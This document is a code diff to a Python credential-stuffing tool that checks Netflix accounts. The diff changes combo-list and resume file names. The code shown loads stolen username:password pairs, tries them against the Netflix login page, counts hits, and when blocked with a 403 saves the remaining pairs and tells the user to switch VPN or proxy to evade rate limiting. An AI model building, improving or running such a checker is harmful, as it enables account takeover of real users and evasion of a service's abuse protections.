@@ -14,7 +14,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver import ActionChains
 
 
-def splitter(filename='netflix'):
+def splitter(filename='netflix.txt'):
     # Combo Splitter
     title()
     users = []
@@ -33,7 +33,7 @@ def splitter(filename='netflix'):
         sys.exit()
     except FileNotFoundError:
         print(
-            "\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding.")
+            "\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix.txt' (no capitalization).\nEnding.")
         sys.exit()
 
 
@@ -43,7 +43,7 @@ counter = 0
 hits = 0
 clear_page = 0
 directory = str(Path(__file__).parent)
-resume_flag = Path(directory, 'resume').exists()
+resume_flag = Path(directory, 'resume.txt').exists()
 
 page = "https://www.netflix.com/login"
 while True:
@@ -56,7 +56,7 @@ while True:
     while True:
         if options == "1":
             #Account Checker
-            combos = splitter('resume') if resume_flag else splitter()
+            combos = splitter('resume.txt') if resume_flag else splitter()
             user = combos[0]
             passw = combos[1]
             title()
@@ -115,7 +115,7 @@ while True:
                         if request.status_code == 403:
                             print(
                                 "\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
-                            with open('resume', 'w') as resume:
+                            with open('resume.txt', 'w') as resume:
                                 for i in range(counter, len(user)):
                                     resume.write("{}:{}\n".format(user[i], passw[i].strip()))
                             sys.exit()
@@ -137,7 +137,7 @@ while True:
             print("\n\033[38;5;226mAll done.")
             input("\n\033[38;5;226mPress Enter.")
             if resume_flag:
-                os.remove('resume')
+                os.remove('resume.txt')
             break
         if options == "2":
             #Exit
